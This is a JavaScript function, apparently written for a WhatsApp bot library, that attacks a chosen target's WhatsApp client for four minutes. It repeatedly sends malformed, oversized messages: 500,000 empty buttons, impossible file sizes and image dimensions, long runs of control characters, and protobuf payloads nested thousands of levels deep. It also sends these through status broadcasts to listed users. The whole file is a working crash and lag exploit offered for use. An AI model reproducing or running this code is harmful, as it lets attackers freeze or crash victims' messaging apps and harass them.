async function DelayBrutalyyy(sock, target) {
    const startTime = Date.now();
    const duration = 4 * 60 * 1000;

    const messsge = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/pdf",
                            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
                            fileLength: 999999999,
                            pageCount: 1000,
                            mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                            fileName: "noname.pptx",
                            fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                            directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1779839963",
                            thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsarcznY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                            thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                            thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                            jpegThumbnail: null,
                            contextInfo: {},
                            thumbnailHeight: 999,
                            thumbnailWidth: 999,
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "watashi wa nihon ikitai desu" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const met = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "noname",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ambataukeumUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "billyyyy javascript" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const lag2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    locationMessage: {
                        degreesLatitude: 9999999999,
                        degreesLongitude: 9999999999
                    },
                    body: { text: "Billy.zip" },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    };

    const lag = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Billy - Executed ¡!" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const ambataukeum = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

    const encodeVarint = (n) => {
        const buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = (tag, data) => Buffer.concat([
        Buffer.from(tag),
        encodeVarint(data.length),
        data
    ]);

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: ambataukeum })
    ).finish();

    const inflate = (tag, depth) => {
        let buf = Payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = (raw) => {
        const s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    const MAX_BATCH = 1;
    const DELAY_MS = 1000;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "c++" },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "php", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u000F".repeat(9000),
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Heksen - Executed‽!", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(9000),
                            version: 3
                        },
                        contextInfo: {
                            quotedMessage: {
                                contactMessage: {
                                    displayName: " ",
                                    vcard: null
                                }
                            }
                        }
                    }
                }
            }
        }, { participant: target });

        await new Promise(r => setTimeout(r, 500));

        const msg1 = generateWAMessageFromContent(target, messsge, {});
        await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

        const msg211 = generateWAMessageFromContent(target, met, {});
        await sock.relayMessage(target, msg211.message, { messageId: msg211.key.id });

        const msgLag2 = generateWAMessageFromContent(target, lag2, {});
        await sock.relayMessage(target, msgLag2.message, { messageId: msgLag2.key.id });

        const msgLag = generateWAMessageFromContent(target, lag, {});
        await sock.relayMessage(target, msgLag.message, { messageId: msgLag.key.id });

        for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
            const bokep = jids.slice(offset, offset + MAX_BATCH);
            const isFirst = offset === 0;

            if (!isFirst) {
                await new Promise(r => setTimeout(r, DELAY_MS));
            }

            const idx = Math.floor(offset / MAX_BATCH) + 1;
            const suffix = idx > 1 ? ('n' + idx) : 'n';
            const msgId = 'hksn' + Date.now().toString(36).toUpperCase() + suffix;

            for (let ti = 0; ti < TAGS.length; ti++) {
                const tag = TAGS[ti];
                let codes = null;

                for (let depth = 5000; depth >= 2000 && !codes; depth -= 400) {
                    try {
                        const decoded = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(decoded).finish();
                        codes = decoded;
                    } catch (_) {}
                }

                if (!codes) continue;

                await sock.relayMessage('status@broadcast', codes, {
                    messageId: msgId,
                    statusJidList: bokep,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: bokep.map(jid => ({
                                tag: 'to',
                                attrs: { jid },
                                content: []
                            }))
                        }]
                    }]
                });
            }
        }
    }
}